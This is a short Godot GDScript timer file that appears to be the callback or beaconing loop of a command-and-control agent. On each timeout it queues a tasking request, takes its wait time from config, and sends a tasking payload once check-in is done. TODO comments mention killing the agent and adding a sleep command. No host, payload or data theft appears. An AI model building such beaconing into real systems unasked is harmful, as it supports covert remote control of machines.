extends Timer

var do_callback
var parent
var api

func _ready():
	parent = $".".get_parent()
	api = parent.get_node("api")

func _on_timeout():
	print("_on_CallbackTimer_timeout, adding tasking request to outbound queue")
	# TODO: if not api.checkin_done and we've had X timeout/callbacks - kill agent?
	do_callback = true

	# TODO: implement command 'sleep' - hook here
	$".".wait_time = parent.get_node("config").get_callback_wait_time()

	if api.checkin_done:
		api.send_agent_response(api.get_tasking_payload())
